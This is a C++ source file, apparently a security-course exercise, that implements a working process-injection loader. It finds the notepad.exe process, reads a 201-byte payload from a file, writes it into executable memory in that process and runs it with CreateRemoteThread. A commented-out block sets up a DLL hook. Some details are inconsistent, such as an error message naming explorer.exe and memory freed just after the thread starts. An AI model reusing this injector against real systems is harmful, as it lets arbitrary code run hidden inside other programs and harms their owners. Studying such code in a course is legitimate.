// BasicLoader.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
FILE* f;
BOOL str_ends_with(const char * str, const char * suffix) {
	size_t str_len;
	size_t suffix_len;
	if( str == NULL || suffix == NULL )
		return FALSE;
	str_len = strlen(str);
	suffix_len = strlen(suffix);
	if(suffix_len > str_len)
		return FALSE;
	return 0 == strncmp( str + str_len - suffix_len, suffix, suffix_len );
}


void _die(char * arg, int retVal) {
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "DIE(%d): %s\n", retVal, arg);
	fclose(f);
	if (retVal != 0) {
		fprintf(stderr, arg);
	} else {
		printf(arg);
	}
	exit(retVal);
};

#define DLL_FILE_NAME "cptnhook.dll"
#define PROC_NAME "HookProc"

BOOL _isProcessNamed(DWORD processID, const char * name) {
	char processName[MAX_PATH];
	HANDLE hProcess;
	HMODULE hMod;
	DWORD cbNeeded;
	processName[0] = 0;
	hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , FALSE, processID);
	if (hProcess != NULL) {
		if (EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName)/sizeof(TCHAR));
		}
	}
	CloseHandle(hProcess);
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "%s\n", processName);
	fclose(f);
	return 0 == _stricmp(processName, name);
}

/*
 * returns the pid of the first process named `name`
 */
DWORD findProcessByName(const char * name) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		if( aProcesses[i] != 0) {
			if (_isProcessNamed(aProcesses[i], name)) {
				return aProcesses[i];
			}
		}
	}
	return 0;
}

int _tmain() {
	int pid, ret;
	HANDLE process;
	FILE* inject;
	byte buf[201];
	size_t bytesRead;
	LPVOID address;
	SIZE_T bytesWritten;
	BOOL wrote, changed, freeOK;
	DWORD oldProtect;
	HANDLE hThread;
	LPTHREAD_START_ROUTINE startRoutine;
	typedef HHOOK (*HINSTALLER)(HMODULE);
	typedef BOOL (*HUNINSTALLER)(HHOOK);
	fopen_s(&f, "c:\\temp.txt", "w");
	fclose(f);

	pid = findProcessByName("notepad.exe");
	if (pid == 0) {
		_die("Failed to find explorer.exe", -1);
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "pid: %d\n", pid);
	fclose(f);
	process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
	if (process == NULL) {
		_die("Failed to OpenProcess !", -2);
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "pHandle: %d\n", process);
	fclose(f);

	inject = NULL;
	ret =fopen_s(&inject,"C:\\Documents and Settings\\Administrator\\My Documents\\GitHub\\kj-security-ex1\\ex4\\InjectMe.dat","rb");
	if (0 != ret){

		_die("Failed to open InjectMe !", -3);
	}
	bytesRead = fread(buf,1,201,inject);
	if (201 != bytesRead){
		_die("Failed to read enough !", -4);
	}
	
	fclose(inject);

	address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		CloseHandle(process);
		_die("Failed to VirtualAllocEx !", -5);
	}

	bytesWritten = 0;
	wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
	if (!wrote){
		_die("Failed to write memory !", -6);
	}
	if (bytesWritten != sizeof(buf)){
		_die("Failed to write enough memory !", -7);
	}
	oldProtect = 0;
	changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READWRITE,&oldProtect);
	if (!changed){
				int err = GetLastError();
		fopen_s(&f, "c:\\temp.txt", "a");
		fprintf(f, "err: %d\n", err);
		fclose(f);
		_die("Failed to change permission!", -8);

	}
	startRoutine = (LPTHREAD_START_ROUTINE)address;
	hThread = CreateRemoteThread(process,NULL,0,startRoutine,NULL,0,NULL);
	if (NULL == hThread){
		_die("Failed to create remote thread !", -9);
	}

	freeOK = VirtualFreeEx(process, address, 0, MEM_RELEASE);
	if (!freeOK) {
		CloseHandle(process);
		_die("Failed to VirtualFreeEx !", -10);
	}

// TODO

	CloseHandle(process);
/*
	HMODULE hMod = LoadLibraryA(DLL_FILE_NAME);
	if (NULL == hMod) {
		_die("Failed to LoadLibraryA !");
	}
	HINSTALLER installProc = (HINSTALLER)GetProcAddress(hMod, "install");
	if (NULL == installProc) {
		_die("Failed to GetProcAddress !");
	}
	HHOOK hookHandle = installProc(hMod);
	if (NULL == hookHandle) {
		_die("Failed to SetWindowsHookEx !");
	}
	int i;
	scanf_s("%d",&i);
	HUNINSTALLER uninstallProc = (HUNINSTALLER)GetProcAddress(hMod, "uninstall");
	if (NULL == uninstallProc) {
		_die("Failed to GetProcAddress 2 !");
	}
	uninstallProc(hookHandle);
*/
	return 0;
}